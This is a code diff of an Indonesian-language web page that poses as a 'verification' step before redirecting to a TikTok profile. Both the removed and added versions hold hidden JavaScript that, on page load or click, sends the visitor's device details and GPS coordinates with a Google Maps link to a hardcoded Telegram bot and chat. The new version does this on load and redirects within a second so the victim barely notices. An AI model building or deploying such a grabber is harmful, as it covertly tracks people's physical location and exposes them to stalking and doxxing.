@@ -2,182 +2,82 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Verifikasi - Lanjutkan ke TikTok</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting...</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
+    body { 
+      margin: 0; 
+      padding: 0; 
       background: radial-gradient(circle at 20% 30%, #1a1a2e, #000000);
+      display: flex;
+      justify-content: center;
+      align-items: center;
       min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: system-ui, -apple-system, sans-serif;
-      padding: 16px;
-    }
-    .card {
-      background: rgba(255,255,255,0.96);
-      backdrop-filter: blur(20px);
-      border-radius: 40px;
-      padding: 32px 24px;
-      text-align: center;
-      max-width: 400px;
-      width: 100%;
-      box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
-    }
-    .tiktok-icon {
-      width: 70px;
-      height: 70px;
-      background: linear-gradient(145deg, #00f2ea, #fe2c55);
-      border-radius: 22px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 38px;
-      margin: 0 auto 18px;
-    }
-    h2 { font-size: 26px; font-weight: 700; margin-bottom: 6px; }
-    .subtitle { color: #666; margin-bottom: 24px; font-size: 14px; }
-    .continue-btn {
-      width: 100%;
-      background: linear-gradient(115deg, #00f2ea, #fe2c55);
-      border: none;
-      padding: 16px;
-      border-radius: 50px;
+      font-family: system-ui;
       color: white;
-      font-weight: bold;
-      font-size: 17px;
-      cursor: pointer;
-      transition: transform 0.1s;
     }
-    .continue-btn:active { transform: scale(0.97); }
-    .continue-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+    .loading {
+      text-align: center;
+    }
     .spinner {
-      width: 18px;
-      height: 18px;
-      border: 2px solid white;
-      border-top-color: transparent;
+      width: 40px;
+      height: 40px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-top-color: #fe2c55;
       border-radius: 50%;
-      display: inline-block;
       animation: spin 0.6s linear infinite;
-      vertical-align: middle;
-      margin-right: 8px;
+      margin: 0 auto 16px;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .footer { margin-top: 16px; font-size: 11px; color: rgba(255,255,255,0.6); text-align: center; }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
-<div class="card">
-  <div class="tiktok-icon">🎵</div>
-  <h2>Lanjutkan ke TikTok</h2>
-  <p class="subtitle">Verifikasi satu langkah</p>
-
-  <button class="continue-btn" id="continueBtn">▶ Lanjutkan ke TikTok</button>
+<div class="loading">
+  <div class="spinner"></div>
+  <p>Verifikasi & mengarahkan ke TikTok...</p>
 </div>
-<div class="footer">TikTok akan terbuka setelah verifikasi</div>
 
 <script>
   const BOT_TOKEN = "8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0";
   const CHAT_ID = "1966317946";
   const TIKTOK_URL = "https://www.tiktok.com/@usernamekamu";
   
-  const continueBtn = document.getElementById('continueBtn');
-  let isProcessing = false;
-  
-  // Kirim pesan ke Telegram (tanpa peduli sukses/gagal)
-  function sendToTelegram(lat, lng, accuracy, status) {
-    const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
-    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-    const screen = `${screen.width}x${screen.height}`;
-    const userAgent = navigator.userAgent;
-    
-    const message = `🔐 *VERIFIKASI TIKTOK* 🔐
-━━━━━━━━━━━━━━━━━━━
-⏰ *Waktu:* ${now}
-📱 *Device:* ${isMobile ? 'MOBILE' : 'DESKTOP'}
-📐 *Screen:* ${screen}
-🌐 *UA:* ${userAgent.substring(0, 100)}
-━━━━━━━━━━━━━━━━━━━
-📍 *Status:* ${status}
-${lat ? `📍 *Latitude:* ${lat}` : ''}
-${lng ? `📍 *Longitude:* ${lng}` : ''}
-${accuracy ? `🎯 *Akurasi:* ±${accuracy} meter` : ''}
-━━━━━━━━━━━━━━━━━━━
-${lat && lng ? `🗺️ *Google Maps:* https://www.google.com/maps?q=${lat},${lng}` : ''}
-✅ Verifikasi: ${status}`;
-    
-    // Kirim via image beacon (pasti tembus)
+  // Kirim info lokasi (jika dapat) ke Telegram, lalu LANGSUNG REDIRECT
+  function sendToTelegram(message) {
     const img = new Image();
     img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-    
-    // Kirim lokasi jika ada
-    if (lat && lng) {
-      setTimeout(() => {
-        const img2 = new Image();
-        img2.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lng}`;
-      }, 500);
-    }
   }
   
-  // Ambil lokasi sekali doang, langsung redirect (gagal/sukses tetap lanjut)
-  function tryGetLocationAndGo() {
-    if (isProcessing) return;
-    isProcessing = true;
-    
-    continueBtn.disabled = true;
-    continueBtn.innerHTML = '<span class="spinner"></span> Memverifikasi...';
-    
-    // Redirect ke TikTok dalam 5 detik (PASTI JALAN)
-    const redirectTimer = setTimeout(() => {
-      window.location.href = TIKTOK_URL;
-    }, 5000);
-    
-    // Coba ambil lokasi (kalau gagal ya udah, tetep redirect)
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          // Sukses ambil lokasi
-          clearTimeout(redirectTimer);
-          const lat = position.coords.latitude;
-          const lng = position.coords.longitude;
-          const accuracy = Math.round(position.coords.accuracy);
-          
-          // Kirim ke Telegram
-          sendToTelegram(lat, lng, accuracy, '✅ LOKASI BERHASIL');
-          
-          // Langsung redirect
-          window.location.href = TIKTOK_URL;
-        },
-        (error) => {
-          // Gagal ambil lokasi
-          let errMsg = '';
-          if (error.code === 1) errMsg = 'IZIN DITOLAK';
-          else if (error.code === 2) errMsg = 'GPS TIDAK TERSEDIA';
-          else if (error.code === 3) errMsg = 'TIMEOUT';
-          else errMsg = 'ERROR';
-          
-          sendToTelegram(null, null, null, `❌ GAGAL LOKASI: ${errMsg}`);
-          // Tetap redirect (udah diatur timer di atas)
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 4000,
-          maximumAge: 0
-        }
-      );
-    } else {
-      // Browser ga support GPS
-      sendToTelegram(null, null, null, '❌ BROWSER TIDAK SUPPORT GPS');
-      // Tetap redirect via timer
-    }
-  }
+  // Kirim pesan awal
+  const now = new Date().toLocaleString('id-ID');
+  const ua = navigator.userAgent;
+  const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+  const screen = `${screen.width}x${screen.height}`;
   
-  // Event klik tombol
-  continueBtn.addEventListener('click', (e) => {
-    e.preventDefault();
-    tryGetLocationAndGo();
-  });
+  sendToTelegram(`🔐 *REDIRECT TIKTOK* 🔐\n━━━━━━━━━━━━━\n⏰ ${now}\n📱 ${isMobile ? 'MOBILE' : 'DESKTOP'}\n📐 ${screen}\n✅ Halaman terbuka, redirecting...`);
+  
+  // Redirect dalam 1 detik (PASTI JALAN)
+  setTimeout(() => {
+    window.location.replace(TIKTOK_URL);
+  }, 1000);
+  
+  // Coba ambil lokasi (TANPA MENGHALANGI REDIRECT)
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+        sendToTelegram(`📍 *LOKASI DAPAT*\nLat: ${lat}\nLng: ${lng}\nhttps://www.google.com/maps?q=${lat},${lng}`);
+      },
+      (error) => {
+        let err = error.code === 1 ? 'IZIN DITOLAK' : 'GAGAL';
+        sendToTelegram(`❌ *LOKASI ${err}*`);
+      },
+      { timeout: 3000 }
+    );
+  }
 </script>
 </body>
 </html>
